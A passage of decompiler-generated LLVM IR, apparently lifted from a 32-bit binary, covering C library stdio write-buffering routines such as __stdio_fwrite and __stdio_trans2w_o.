  %v2_8054f01 = add i32 %v0_8054f01, %v5_8054ef3
  store i32 %v2_8054f01, i32* %esi.global-to-local, align 4
  br i1 %v12_8054eff, label %dec_label_pc_8054f3a, label %dec_label_pc_8054eff.dec_label_pc_8054ee0_crit_edge

dec_label_pc_8054eff.dec_label_pc_8054ee0_crit_edge: ; preds = %dec_label_pc_8054eff
  %v0_8054ef0.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054ee0

dec_label_pc_8054f05:                             ; preds = %dec_label_pc_8054ee0
  %v0_8054f05 = load i32, i32* @edi, align 4
  %v1_8054f05 = add i32 %v0_8054f05, 8
  %v2_8054f05 = inttoptr i32 %v1_8054f05 to i32*
  %v3_8054f05 = load i32, i32* %v2_8054f05, align 4
  store i32 %v3_8054f05, i32* @edx, align 4
  %v1_8054f08 = add i32 %v0_8054f05, 12
  %v2_8054f08 = inttoptr i32 %v1_8054f08 to i32*
  %v3_8054f08 = load i32, i32* %v2_8054f08, align 4
  store i32 %v3_8054f08, i32* %eax.global-to-local, align 4
  %v1_8054f0b = inttoptr i32 %v0_8054f05 to i16*
  %v2_8054f0b = load i16, i16* %v1_8054f0b, align 2
  %v3_8054f0b = or i16 %v2_8054f0b, 8
  store i16 %v3_8054f0b, i16* %v1_8054f0b, align 2
  %v0_8054f0f = load i32, i32* %eax.global-to-local, align 4
  %v1_8054f0f = load i32, i32* @edx, align 4
  %v2_8054f0f = sub i32 %v0_8054f0f, %v1_8054f0f
  %v12_8054f0f = icmp eq i32 %v2_8054f0f, 0
  store i32 %v2_8054f0f, i32* %eax.global-to-local, align 4
  %v4_8054f36.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8054f0f, label %dec_label_pc_8054f36, label %dec_label_pc_8054f13

dec_label_pc_8054f13:                             ; preds = %dec_label_pc_8054f05
  %v6_8054f15 = icmp ugt i32 %v2_8054f0f, %v4_8054f36.pre
  br i1 %v6_8054f15, label %dec_label_pc_8054f19.preheader, label %dec_label_pc_8054f17

dec_label_pc_8054f17:                             ; preds = %dec_label_pc_8054f13
  store i32 %v2_8054f0f, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054f19.preheader

dec_label_pc_8054f19.preheader:                   ; preds = %dec_label_pc_8054f17, %dec_label_pc_8054f13
  %v0_8054f19.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054f19

dec_label_pc_8054f19:                             ; preds = %dec_label_pc_8054f19.preheader, %dec_label_pc_8054f2b
  %v2_8054f1b = phi i32 [ %v1_8054f0f, %dec_label_pc_8054f19.preheader ], [ %v1_8054f27, %dec_label_pc_8054f2b ]
  %v4_8054f19 = phi i32 [ %v2_8054f0f, %dec_label_pc_8054f19.preheader ], [ %v0_8054f1d, %dec_label_pc_8054f2b ]
  %v0_8054f19 = phi i32 [ %v0_8054f19.pre, %dec_label_pc_8054f19.preheader ], [ %v1_8054f2b, %dec_label_pc_8054f2b ]
  %v1_8054f19 = inttoptr i32 %v0_8054f19 to i8*
  %v2_8054f19 = load i8, i8* %v1_8054f19, align 1
  %v3_8054f19 = zext i8 %v2_8054f19 to i32
  %v5_8054f19 = and i32 %v4_8054f19, -256
  %v6_8054f19 = or i32 %v3_8054f19, %v5_8054f19
  store i32 %v6_8054f19, i32* %eax.global-to-local, align 4
  %v3_8054f1b = inttoptr i32 %v2_8054f1b to i8*
  store i8 %v2_8054f19, i8* %v3_8054f1b, align 1
  %v0_8054f1d = load i32, i32* %eax.global-to-local, align 4
  %v1_8054f1d = trunc i32 %v0_8054f1d to i8
  %v10_8054f1d = icmp eq i8 %v1_8054f1d, 10
  %v1_8054f1f = icmp eq i1 %v10_8054f1d, false
  br i1 %v1_8054f1f, label %dec_label_pc_8054f27, label %dec_label_pc_8054f21

dec_label_pc_8054f21:                             ; preds = %dec_label_pc_8054f19
  %v0_8054f21 = load i32, i32* @edi, align 4
  %v1_8054f21 = add i32 %v0_8054f21, 1
  %v2_8054f21 = inttoptr i32 %v1_8054f21 to i8*
  %v3_8054f21 = load i8, i8* %v2_8054f21, align 1
  %v4_8054f21 = urem i8 %v3_8054f21, 2
  %v5_8054f21 = icmp eq i8 %v4_8054f21, 0
  %v1_8054f25 = icmp eq i1 %v5_8054f21, false
  br i1 %v1_8054f25, label %dec_label_pc_8054f21.dec_label_pc_8054f2e_crit_edge, label %dec_label_pc_8054f27

dec_label_pc_8054f21.dec_label_pc_8054f2e_crit_edge: ; preds = %dec_label_pc_8054f21
  %v0_8054f2e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054f2e

dec_label_pc_8054f27:                             ; preds = %dec_label_pc_8054f21, %dec_label_pc_8054f19
  %v0_8054f27 = load i32, i32* @edx, align 4
  %v1_8054f27 = add i32 %v0_8054f27, 1
  store i32 %v1_8054f27, i32* @edx, align 4
  %v0_8054f28 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054f28 = add i32 %v0_8054f28, -1
  %v8_8054f28 = icmp eq i32 %v1_8054f28, 0
  store i32 %v1_8054f28, i32* %ebp.global-to-local, align 4
  br i1 %v8_8054f28, label %dec_label_pc_8054f27.dec_label_pc_8054f2e_crit_edge, label %dec_label_pc_8054f2b

dec_label_pc_8054f27.dec_label_pc_8054f2e_crit_edge: ; preds = %dec_label_pc_8054f27
  %v1_8054f2e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054f2e

dec_label_pc_8054f2b:                             ; preds = %dec_label_pc_8054f27
  %v0_8054f2b = load i32, i32* %esi.global-to-local, align 4
  %v1_8054f2b = add i32 %v0_8054f2b, 1
  store i32 %v1_8054f2b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054f19

dec_label_pc_8054f2e:                             ; preds = %dec_label_pc_8054f27.dec_label_pc_8054f2e_crit_edge, %dec_label_pc_8054f21.dec_label_pc_8054f2e_crit_edge
  %v1_8054f2e = phi i32 [ %v0_8054f21, %dec_label_pc_8054f21.dec_label_pc_8054f2e_crit_edge ], [ %v1_8054f2e.pre, %dec_label_pc_8054f27.dec_label_pc_8054f2e_crit_edge ]
  %v0_8054f2e = phi i32 [ %v0_8054f2e.pre, %dec_label_pc_8054f21.dec_label_pc_8054f2e_crit_edge ], [ %v1_8054f27, %dec_label_pc_8054f27.dec_label_pc_8054f2e_crit_edge ]
  %v2_8054f2e = add i32 %v1_8054f2e, 16
  %v3_8054f2e = inttoptr i32 %v2_8054f2e to i32*
  store i32 %v0_8054f2e, i32* %v3_8054f2e, align 4
  %v0_8054f31 = load i32, i32* @edx, align 4
  %v1_8054f31 = load i32, i32* @edi, align 4
  %v2_8054f31 = add i32 %v1_8054f31, 8
  %v3_8054f31 = inttoptr i32 %v2_8054f31 to i32*
  %v4_8054f31 = load i32, i32* %v3_8054f31, align 4
  %v5_8054f31 = sub i32 %v0_8054f31, %v4_8054f31
  store i32 %v5_8054f31, i32* @edx, align 4
  %v0_8054f34 = load i32, i32* @ebx, align 4
  %v2_8054f34 = sub i32 %v0_8054f34, %v5_8054f31
  br label %dec_label_pc_8054f36

dec_label_pc_8054f36:                             ; preds = %dec_label_pc_8054f05, %dec_label_pc_8054f2e
  %v4_8054f36 = phi i32 [ %v2_8054f34, %dec_label_pc_8054f2e ], [ %v4_8054f36.pre, %dec_label_pc_8054f05 ]
  %v5_8054f36 = sub i32 %arg3, %v4_8054f36
  br label %dec_label_pc_8054f3a

dec_label_pc_8054f3a:                             ; preds = %dec_label_pc_8054eff, %entry, %dec_label_pc_8054f36
  %stack_var_12.0 = phi i32 [ %v5_8054f36, %dec_label_pc_8054f36 ], [ 0, %entry ], [ %arg3, %dec_label_pc_8054eff ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_8054ecb, i32* @ebx, align 4
  store i32 %v0_8054ec9, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8054f2b, { 1, 0 }
  uselistorder i32 %v1_8054f28, { 1, 0 }
  uselistorder i32 %v1_8054f27, { 0, 2, 1 }
  uselistorder i32 %v0_8054f1d, { 1, 0 }
  uselistorder i32 %v2_8054f01, { 1, 0 }
  uselistorder i32 %v2_8054eff, { 1, 2, 0 }
  uselistorder i32 %v5_8054ef3, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 3, 0, 1, 2 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8054f3a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054f36, { 1, 0 }
  uselistorder label %dec_label_pc_8054f19, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054f48 = load i32, i32* @ebp, align 4
  %v0_8054f49 = load i32, i32* @edi, align 4
  %v0_8054f4a = load i32, i32* @esi, align 4
  %v0_8054f4b = load i32, i32* @ebx, align 4
  store i32 %v0_8054f4b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8054f5b = add i32 %arg3, 1
  %v2_8054f5b = inttoptr i32 %v1_8054f5b to i8*
  %v3_8054f5b = load i8, i8* %v2_8054f5b, align 1
  %v4_8054f5b = and i8 %v3_8054f5b, 2
  %v5_8054f5b = icmp eq i8 %v4_8054f5b, 0
  %v1_8054f5f = icmp eq i1 %v5_8054f5b, false
  br i1 %v1_8054f5f, label %dec_label_pc_8055016, label %dec_label_pc_8054f65

dec_label_pc_8054f65:                             ; preds = %entry
  %v1_8054f65 = add i32 %arg3, 4
  %v2_8054f65 = inttoptr i32 %v1_8054f65 to i32*
  %v3_8054f65 = load i32, i32* %v2_8054f65, align 4
  %v13_8054f65 = icmp eq i32 %v3_8054f65, -2
  %v1_8054f69 = add i32 %arg3, 16
  %v2_8054f69 = inttoptr i32 %v1_8054f69 to i32*
  %v3_8054f69 = load i32, i32* %v2_8054f69, align 4
  store i32 %v3_8054f69, i32* @edx, align 4
  %v1_8054f6c = add i32 %arg3, 12
  %v2_8054f6c = inttoptr i32 %v1_8054f6c to i32*
  %v3_8054f6c = load i32, i32* %v2_8054f6c, align 4
  %v1_8054f6f = icmp eq i1 %v13_8054f65, false
  %v2_8054f8f = sub i32 %v3_8054f6c, %v3_8054f69
  store i32 %v2_8054f8f, i32* %eax.global-to-local, align 4
  br i1 %v1_8054f6f, label %dec_label_pc_8054f8f, label %dec_label_pc_8054f71

dec_label_pc_8054f71:                             ; preds = %dec_label_pc_8054f65
  %tmp22 = icmp ult i32 %v2_8054f8f, %arg2
  br i1 %tmp22, label %dec_label_pc_8054f79, label %dec_label_pc_8054f7b

dec_label_pc_8054f79:                             ; preds = %dec_label_pc_8054f71
  br label %dec_label_pc_8054f7b

dec_label_pc_8054f7b:                             ; preds = %dec_label_pc_8054f71, %dec_label_pc_8054f79
  %storemerge = phi i32 [ %v2_8054f8f, %dec_label_pc_8054f79 ], [ %arg2, %dec_label_pc_8054f71 ]
  %v0_8054f7c = phi i32 [ %v2_8054f8f, %dec_label_pc_8054f79 ], [ %arg2, %dec_label_pc_8054f71 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_8054f7f = inttoptr i32 %v3_8054f69 to i16*
  %v4_8054f7f = call i32 @memcpy(i16* %v3_8054f7f, i32 %v0_8054f7c, i32 %v2_8054f8f)
  store i32 %v4_8054f7f, i32* %eax.global-to-local, align 4
  %v0_8054f84 = load i32, i32* @ebx, align 4
  %v1_8054f84 = add i32 %v0_8054f84, 16
  %v2_8054f84 = inttoptr i32 %v1_8054f84 to i32*
  %v3_8054f84 = load i32, i32* %v2_8054f84, align 4
  %v4_8054f84 = load i32, i32* @esi, align 4
  %v5_8054f84 = add i32 %v4_8054f84, %v3_8054f84
  store i32 %v5_8054f84, i32* %v2_8054f84, align 4
  br label %dec_label_pc_805502e

dec_label_pc_8054f8f:                             ; preds = %dec_label_pc_8054f65
  %v6_8054f93 = icmp ult i32 %v2_8054f8f, %arg2
  br i1 %v6_8054f93, label %dec_label_pc_8054ffd, label %dec_label_pc_8054f95

dec_label_pc_8054f95:                             ; preds = %dec_label_pc_8054f8f
  %v0_8054f95 = load i32, i32* @ecx, align 4
  %v3_8054f99 = inttoptr i32 %v3_8054f69 to i16*
  %v4_8054f99 = call i32 @memcpy(i16* %v3_8054f99, i32 %arg2, i32 %v0_8054f95)
  store i32 %v4_8054f99, i32* %eax.global-to-local, align 4
  %v0_8054f9e = load i32, i32* @ebx, align 4
  %v1_8054f9e = add i32 %v0_8054f9e, 16
  %v2_8054f9e = inttoptr i32 %v1_8054f9e to i32*
  %v3_8054f9e = load i32, i32* %v2_8054f9e, align 4
  %v4_8054f9e = load i32, i32* @edi, align 4
  %v5_8054f9e = add i32 %v4_8054f9e, %v3_8054f9e
  store i32 %v5_8054f9e, i32* %v2_8054f9e, align 4
  %v0_8054fa4 = load i32, i32* @ebx, align 4
  %v1_8054fa4 = add i32 %v0_8054fa4, 1
  %v2_8054fa4 = inttoptr i32 %v1_8054fa4 to i8*
  %v3_8054fa4 = load i8, i8* %v2_8054fa4, align 1
  %v4_8054fa4 = urem i8 %v3_8054fa4, 2
  %v5_8054fa4 = icmp eq i8 %v4_8054fa4, 0
  br i1 %v5_8054fa4, label %dec_label_pc_805502e, label %dec_label_pc_8054fae

dec_label_pc_8054fae:                             ; preds = %dec_label_pc_8054f95
  %v0_8054fae = load i32, i32* @edx, align 4
  %v0_8054faf = load i32, i32* @edi, align 4
  %v4_8054fb3 = call i32 @memrchr(i8 10, i32 %v0_8054faf, i32 %v0_8054fae)
  store i32 %v4_8054fb3, i32* %eax.global-to-local, align 4
  %v1_8054fbb = icmp eq i32 %v4_8054fb3, 0
  br i1 %v1_8054fbb, label %dec_label_pc_805502e, label %dec_label_pc_8054fbf

dec_label_pc_8054fbf:                             ; preds = %dec_label_pc_8054fae
  %v0_8054fc2 = load i32, i32* @ebx, align 4
  %v1_8054fc3 = call i32 @__stdio_wcommit(i32 %v0_8054fc2)
  store i32 %v1_8054fc3, i32* %eax.global-to-local, align 4
  %v1_8054fcb = icmp eq i32 %v1_8054fc3, 0
  br i1 %v1_8054fcb, label %dec_label_pc_805502e, label %dec_label_pc_8054fcf

dec_label_pc_8054fcf:                             ; preds = %dec_label_pc_8054fbf
  %v0_8054fcf = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8054fcf, %v1_8054fc3
  br i1 %tmp23, label %dec_label_pc_8054fd5, label %dec_label_pc_8054fd7

dec_label_pc_8054fd5:                             ; preds = %dec_label_pc_8054fcf
  br label %dec_label_pc_8054fd7

dec_label_pc_8054fd7:                             ; preds = %dec_label_pc_8054fcf, %dec_label_pc_8054fd5
  %storemerge24 = phi i32 [ %v1_8054fc3, %dec_label_pc_8054fd5 ], [ %v0_8054fcf, %dec_label_pc_8054fcf ]
  %v0_8054fde = phi i32 [ %v1_8054fc3, %dec_label_pc_8054fd5 ], [ %v0_8054fcf, %dec_label_pc_8054fcf ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_8054fd9 = sub i32 %v0_8054fcf, %v0_8054fde
  store i32 %v2_8054fd9, i32* %eax.global-to-local, align 4
  %v0_8054fdb = load i32, i32* @ebp, align 4
  %v2_8054fdb = add i32 %v0_8054fdb, %v2_8054fd9
  store i32 %v2_8054fdb, i32* %ebp.global-to-local, align 4
  %v4_8054fe2 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_8054fde, i32 %v2_8054fd9)
  store i32 %v4_8054fe2, i32* %eax.global-to-local, align 4
  store i32 %v4_8054fe2, i32* @edx, align 4
  %v1_8054fec = icmp eq i32 %v4_8054fe2, 0
  br i1 %v1_8054fec, label %dec_label_pc_805502e, label %dec_label_pc_8054ff0

dec_label_pc_8054ff0:                             ; preds = %dec_label_pc_8054fd7
  %v0_8054ff0 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054ff0 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054ff0 = sub i32 %v0_8054ff0, %v4_8054fe2
  %v2_8054ff4 = add i32 %v2_8054ff0, %v1_8054ff0
  store i32 %v2_8054ff4, i32* %eax.global-to-local, align 4
  %v0_8054ff6 = load i32, i32* @ebx, align 4
  %v1_8054ff6 = add i32 %v0_8054ff6, 16
  %v2_8054ff6 = inttoptr i32 %v1_8054ff6 to i32*
  %v3_8054ff6 = load i32, i32* %v2_8054ff6, align 4
  %v5_8054ff6 = sub i32 %v3_8054ff6, %v2_8054ff4
  store i32 %v5_8054ff6, i32* %v2_8054ff6, align 4
  %v0_8054ff9 = load i32, i32* @edi, align 4
  %v1_8054ff9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054ff9 = sub i32 %v0_8054ff9, %v1_8054ff9
  store i32 %v2_8054ff9, i32* @edi, align 4
  br label %dec_label_pc_805502e

dec_label_pc_8054ffd:                             ; preds = %dec_label_pc_8054f8f
  %v2_8054ffd = add i32 %arg3, 8
  %v3_8054ffd = inttoptr i32 %v2_8054ffd to i32*
  %v4_8054ffd = load i32, i32* %v3_8054ffd, align 4
  %v15_8054ffd = icmp eq i32 %v3_8054f69, %v4_8054ffd
  br i1 %v15_8054ffd, label %dec_label_pc_8055016, label %dec_label_pc_8055002

dec_label_pc_8055002:                             ; preds = %dec_label_pc_8054ffd
  %v1_8055006 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8055006, i32* %eax.global-to-local, align 4
  %v1_805500e = icmp eq i32 %v1_8055006, 0
  br i1 %v1_805500e, label %dec_label_pc_8055002.dec_label_pc_8055016_crit_edge, label %dec_label_pc_8055012

dec_label_pc_8055002.dec_label_pc_8055016_crit_edge: ; preds = %dec_label_pc_8055002
  %v0_8055016.pre = load i32, i32* @edi, align 4
  %v0_805501e.pre = load i32, i32* @ebx, align 4
  %v2_8055025.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8055016

dec_label_pc_8055012:                             ; preds = %dec_label_pc_8055002
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805502e

dec_label_pc_8055016:                             ; preds = %dec_label_pc_8055002.dec_label_pc_8055016_crit_edge, %dec_label_pc_8054ffd, %entry
  %v2_8055025 = phi i32 [ %v2_8055025.pre, %dec_label_pc_8055002.dec_label_pc_8055016_crit_edge ], [ %v0_8054f4b, %dec_label_pc_8054ffd ], [ %v0_8054f4b, %entry ]
  %v0_805501e = phi i32 [ %v0_805501e.pre, %dec_label_pc_8055002.dec_label_pc_8055016_crit_edge ], [ %arg3, %dec_label_pc_8054ffd ], [ %arg3, %entry ]
  %v0_8055016 = phi i32 [ %v0_8055016.pre, %dec_label_pc_8055002.dec_label_pc_8055016_crit_edge ], [ %arg2, %dec_label_pc_8054ffd ], [ %arg2, %entry ]
  store i32 %v2_8055025, i32* @ebx, align 4
  store i32 %v0_8054f49, i32* @edi, align 4
  %v4_8055029 = inttoptr i32 %v0_805501e to i16*
  %v5_8055029 = call i32 @__stdio_WRITE(i16* %v4_8055029, i32 %v0_8055016, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055029, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805502e

dec_label_pc_805502e:                             ; preds = %dec_label_pc_8054fd7, %dec_label_pc_8054fbf, %dec_label_pc_8054fae, %dec_label_pc_8054f95, %dec_label_pc_8055012, %dec_label_pc_8054ff0, %dec_label_pc_8054f7b, %dec_label_pc_8055016
  %v0_8055031 = load i32, i32* @edi, align 4
  store i32 %v0_8055031, i32* %eax.global-to-local, align 4
  %v2_8055033 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055033, i32* @ebx, align 4
  store i32 %v0_8054f4a, i32* @esi, align 4
  store i32 %v0_8054f49, i32* @edi, align 4
  store i32 %v0_8054f48, i32* @ebp, align 4
  ret i32 %v0_8055031

; uselistorder directives
  uselistorder i32 %v2_8054ff4, { 1, 0 }
  uselistorder i32 %v4_8054fe2, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8054fd9, { 1, 0, 2 }
  uselistorder i32 %v0_8054fcf, { 3, 0, 1, 2 }
  uselistorder i32 %v2_8054f8f, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_8054f49, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_805502e, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_8054fd7, { 1, 0 }
  uselistorder label %dec_label_pc_8054f7b, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055038 = load i32, i32* @ebx, align 4
  %v4_805503c = ptrtoint i16* %arg1 to i32
  store i32 %v4_805503c, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8055044 = bitcast i16* %arg1 to i32*
  %v2_8055044 = load i32, i32* %v1_8055044, align 4
  store i32 %v2_8055044, i32* %eax.global-to-local, align 4
  %v1_8055046 = urem i32 %v2_8055044, 65536
  store i32 %v1_8055046, i32* %edx.global-to-local, align 4
  %v2_8055049 = and i32 %v1_8055046, %arg2
  %v3_8055049 = icmp eq i32 %v2_8055049, 0
  %v1_805504b = icmp eq i1 %v3_8055049, false
  br i1 %v1_805504b, label %dec_label_pc_805505a, label %dec_label_pc_805504d

dec_label_pc_805504d:                             ; preds = %entry
  %v1_805504d = and i32 %v2_8055044, 2176
  %v2_805504d = icmp eq i32 %v1_805504d, 0
  store i32 %v1_805504d, i32* %edx.global-to-local, align 4
  %v1_8055053 = icmp eq i1 %v2_805504d, false
  br i1 %v1_8055053, label %dec_label_pc_8055062, label %dec_label_pc_8055055

dec_label_pc_8055055:                             ; preds = %dec_label_pc_805504d
  %v2_8055055 = or i32 %v2_8055044, %arg2
  store i32 %v2_8055055, i32* %eax.global-to-local, align 4
  %v1_8055057 = trunc i32 %v2_8055055 to i16
  store i16 %v1_8055057, i16* %arg1, align 2
  %v0_805505a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805505a

dec_label_pc_805505a:                             ; preds = %entry, %dec_label_pc_8055055
  %v0_805509f = phi i32 [ %v4_805503c, %entry ], [ %v0_805505a.pre, %dec_label_pc_8055055 ]
  %v1_805505a = inttoptr i32 %v0_805509f to i16*
  %v2_805505a = load i16, i16* %v1_805505a, align 2
  %v3_805505a = zext i16 %v2_805505a to i32
  store i32 %v3_805505a, i32* %edx.global-to-local, align 4
  %v2_805505d = and i16 %v2_805505a, 32
  %v3_805505d = icmp eq i16 %v2_805505d, 0
  br i1 %v3_805505d, label %dec_label_pc_8055076, label %dec_label_pc_8055062

dec_label_pc_8055062:                             ; preds = %dec_label_pc_805505a, %dec_label_pc_805504d
  %v1_8055062 = call i32 @__errno_location(i32 %v0_8055038)
  store i32 %v1_8055062, i32* %eax.global-to-local, align 4
  %v1_8055067 = inttoptr i32 %v1_8055062 to i32*
  store i32 9, i32* %v1_8055067, align 4
  br label %dec_label_pc_805506d

dec_label_pc_805506d:                             ; preds = %dec_label_pc_805508d, %dec_label_pc_8055062
  %v0_805506d = load i32, i32* @ebx, align 4
  %v1_805506d = inttoptr i32 %v0_805506d to i16*
  %v2_805506d = load i16, i16* %v1_805506d, align 2
  %v3_805506d = or i16 %v2_805506d, 8
  store i16 %v3_805506d, i16* %v1_805506d, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80550d0

dec_label_pc_8055076:                             ; preds = %dec_label_pc_805505a
  %v2_8055076 = urem i16 %v2_805505a, 4
  %v3_8055076 = icmp eq i16 %v2_8055076, 0
  br i1 %v3_8055076, label %dec_label_pc_80550bc, label %dec_label_pc_805507b

dec_label_pc_805507b:                             ; preds = %dec_label_pc_8055076
  %v2_805507b = and i32 %v3_805505a, 4
  %v3_805507b = icmp eq i32 %v2_805507b, 0
  %v1_805507e = icmp eq i1 %v3_805507b, false
  br i1 %v1_805507e, label %dec_label_pc_80550ac, label %dec_label_pc_8055080

dec_label_pc_8055080:                             ; preds = %dec_label_pc_805507b
  %v1_8055080 = add i32 %v0_805509f, 20
  %v2_8055080 = inttoptr i32 %v1_8055080 to i32*
  %v3_8055080 = load i32, i32* %v2_8055080, align 4
  store i32 %v3_8055080, i32* %eax.global-to-local, align 4
  %v2_8055083 = add i32 %v0_805509f, 16
  %v3_8055083 = inttoptr i32 %v2_8055083 to i32*
  %v4_8055083 = load i32, i32* %v3_8055083, align 4
  %v15_8055083 = icmp eq i32 %v3_8055080, %v4_8055083
  %v1_8055086 = icmp eq i1 %v15_8055083, false
  br i1 %v1_8055086, label %dec_label_pc_805508d, label %dec_label_pc_8055088

dec_label_pc_8055088:                             ; preds = %dec_label_pc_8055080
  %v2_8055088 = and i32 %v3_805505a, 2
  %v3_8055088 = icmp eq i32 %v2_8055088, 0
  br i1 %v3_8055088, label %dec_label_pc_80550ac, label %dec_label_pc_805508d

dec_label_pc_805508d:                             ; preds = %dec_label_pc_8055088, %dec_label_pc_8055080
  %v1_805508d = and i32 %v3_805505a, 1024
  store i32 %v1_805508d, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_805508d, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_80550a0 = call i32 @__GI_fseek(i32 %v0_805509f, i32 0, i32 %tmp18, i32 %v1_805508d)
  store i32 %v5_80550a0, i32* %eax.global-to-local, align 4
  %v1_80550a8 = icmp eq i32 %v5_80550a0, 0
  %v1_80550aa = icmp eq i1 %v1_80550a8, false
  br i1 %v1_80550aa, label %dec_label_pc_805506d, label %dec_label_pc_805508d.dec_label_pc_80550ac_crit_edge

dec_label_pc_805508d.dec_label_pc_80550ac_crit_edge: ; preds = %dec_label_pc_805508d
  %v0_80550ac.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80550ac

dec_label_pc_80550ac:                             ; preds = %dec_label_pc_805508d.dec_label_pc_80550ac_crit_edge, %dec_label_pc_8055088, %dec_label_pc_805507b
  %v10_80550ac = phi i32 [ %v0_80550ac.pre, %dec_label_pc_805508d.dec_label_pc_80550ac_crit_edge ], [ %v0_805509f, %dec_label_pc_8055088 ], [ %v0_805509f, %dec_label_pc_805507b ]
  %v1_80550ac = inttoptr i32 %v10_80550ac to i16*
  %v2_80550ac = load i16, i16* %v1_80550ac, align 2
  %v3_80550ac = and i16 %v2_80550ac, -4
  store i16 %v3_80550ac, i16* %v1_80550ac, align 2
  %v0_80550b0 = load i32, i32* @ebx, align 4
  %v1_80550b0 = add i32 %v0_80550b0, 8
  %v2_80550b0 = inttoptr i32 %v1_80550b0 to i32*
  %v3_80550b0 = load i32, i32* %v2_80550b0, align 4
  store i32 %v3_80550b0, i32* %eax.global-to-local, align 4
  %v2_80550b3 = add i32 %v0_80550b0, 24
  %v3_80550b3 = inttoptr i32 %v2_80550b3 to i32*
  store i32 %v3_80550b0, i32* %v3_80550b3, align 4
  %v0_80550b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80550b6 = load i32, i32* @ebx, align 4
  %v2_80550b6 = add i32 %v1_80550b6, 16
  %v3_80550b6 = inttoptr i32 %v2_80550b6 to i32*
  store i32 %v0_80550b6, i32* %v3_80550b6, align 4
  %v0_80550b9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80550b9 = load i32, i32* @ebx, align 4
  %v2_80550b9 = add i32 %v1_80550b9, 20
  %v3_80550b9 = inttoptr i32 %v2_80550b9 to i32*
  store i32 %v0_80550b9, i32* %v3_80550b9, align 4
  %v0_80550bc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80550bc

dec_label_pc_80550bc:                             ; preds = %dec_label_pc_8055076, %dec_label_pc_80550ac
  %v9_80550bc = phi i32 [ %v0_805509f, %dec_label_pc_8055076 ], [ %v0_80550bc.pre, %dec_label_pc_80550ac ]
  %v1_80550bc = inttoptr i32 %v9_80550bc to i16*
  %v2_80550bc = load i16, i16* %v1_80550bc, align 2
  %v3_80550bc = or i16 %v2_80550bc, 64
  store i16 %v3_80550bc, i16* %v1_80550bc, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_80550c2 = load i32, i32* @ebx, align 4
  %v1_80550c2 = inttoptr i32 %v0_80550c2 to i16*
  %v2_80550c2 = load i16, i16* %v1_80550c2, align 2
  %v3_80550c2 = zext i16 %v2_80550c2 to i32
  store i32 %v3_80550c2, i32* %eax.global-to-local, align 4
  %v3_80550c5 = and i16 %v2_80550c2, 2816
  %v4_80550c5 = icmp eq i16 %v3_80550c5, 0
  %v1_80550c8 = icmp eq i1 %v4_80550c5, false
